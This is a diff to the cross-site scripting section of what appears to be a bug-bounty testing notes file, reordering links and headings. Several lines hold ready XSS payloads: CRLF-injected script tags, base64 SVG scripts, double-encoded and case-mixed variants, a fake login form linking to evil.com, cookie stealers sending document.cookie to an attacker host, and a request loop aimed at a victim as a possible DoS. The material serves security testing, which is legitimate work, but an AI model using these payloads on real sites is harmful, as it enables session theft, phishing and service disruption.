@@ -2079,7 +2079,12 @@ Manually testing for XXE vulnerabilities generally involves
 
 ### <ins>Cross-site scripting (XSS)</ins>
 
-**Resources**
+#### <ins>Bookmarks</ins>
+- [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
+- [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
+- [XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
+
+#### <ins>Resources</ins>
 - [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
   - [python3 version](https://github.com/L1NT/xsscrapy) 
 - For blind XSS
@@ -2088,17 +2093,26 @@ Manually testing for XXE vulnerabilities generally involves
 - [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
 - [Weaponised XSS payloads](https://github.com/hakluke/weaponised-XSS-payloads)
 - [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-- Articles
-  - [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
-  - [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
-  - [XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
+- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
 
-**CSP**
+#### <ins>Bypasses</ins>
+- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
+- [JSFuck](http://www.jsfuck.com/)
+- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
+- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
+- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
+- Cross Site Tracing: If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. [[Reference](https://owasp.org/www-community/attacks/Cross_Site_Tracing)]
+
+#### <ins>CSP</ins>
 - [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
 - [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
 - [CSP Bypass](https://github.com/PortSwigger/csp-bypass)
 
-**Swagger XSS**
+#### <ins>Blind XSS</ins>
+- Insert a payload in the User-Agent, try with the match/replace rule
+- Other endpoints: pending review comments, feedback
+
+#### <ins>Swagger XSS</ins>
 - https://github.com/swagger-api/swagger-ui/issues/1262
 - https://github.com/swagger-api/swagger-ui/issues/3847<br/>
   `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS%20all%20the%20things/swag-test.json`
@@ -2106,26 +2120,12 @@ Manually testing for XXE vulnerabilities generally involves
   `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy9zd2FnLXRlc3QueWFtbCIKfQ==`
 - Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`
 
-**Blind XSS**
-- Insert a payload in the User-Agent, try with the match/replace rule
-- Other endpoints: pending review comments, feedback
-
-**Bypasses**
-- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
-- [JSFuck](http://www.jsfuck.com/)
-- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
-- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
-- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
-
-**Carriage Return Line Feed (CRLF) injection**
+#### <ins>Carriage Return Line Feed (CRLF) injection</ins>
 - `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
 
-**Cross Site Tracing**
-- If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. [[Reference](https://owasp.org/www-community/attacks/Cross_Site_Tracing)]
-
-**Payloads**
+#### <ins>Payloads</ins>
 - HTML injection
   - ```HTML
     <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
@@ -2135,9 +2135,14 @@ Manually testing for XXE vulnerabilities generally involves
     ```
 - [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
 - For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
+- [XSS Without parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
 - iframe + base64 encoded SVG 
   ```HTML
   <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
+  ```
+- Small SVG base64
+  ```HTML
+  data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
   ```
 - Cookie stealers
   - ```JavaScript
@@ -2149,6 +2154,20 @@ Manually testing for XXE vulnerabilities generally involves
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
     ```
+- Unusual events
+  - `onpointerrawupdate` (Chrome only)
+  - `onmouseleave`
+- Can't use `alert`, `confirm` or `prompt`? Try `print()`! [[Reference](https://portswigger.net/research/alert-is-dead-long-live-print)]
+- This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
+  ```JavaScript
+  for(;;){fetch('https://VICTIM/',{method:'GET'});}
+  ```
+- ```HTML
+  %253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
+  ```
+- ```HTML
+  <a href="jAvAsCrIpT:alert(1)">payload</a>
+  ```
 - ```JavaScript
   %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
   ```
@@ -2158,26 +2177,6 @@ Manually testing for XXE vulnerabilities generally involves
 - ```HTML
   <svg/onload=alert(0)>
   ```
-- Unusual events
-  - `onpointerrawupdate` (Chrome only)
-  - `onmouseleave`
-- This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
-  ```JavaScript
-  for(;;){fetch('https://VICTIM/',{method:'GET'});}
-  ```
-- Double encoding
-  ```HTML
-  %253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
-  ```
-- Small SVG base64
-  ```HTML
-  data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
-  ```
-- jAvAsCrIpT
-  ```HTML
-  <a href="jAvAsCrIpT:alert(1)">payload</a>
-  ```
-- Can't use `alert`, `confirm` or `prompt`? Try `print()`! [[Reference](https://portswigger.net/research/alert-is-dead-long-live-print)]
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
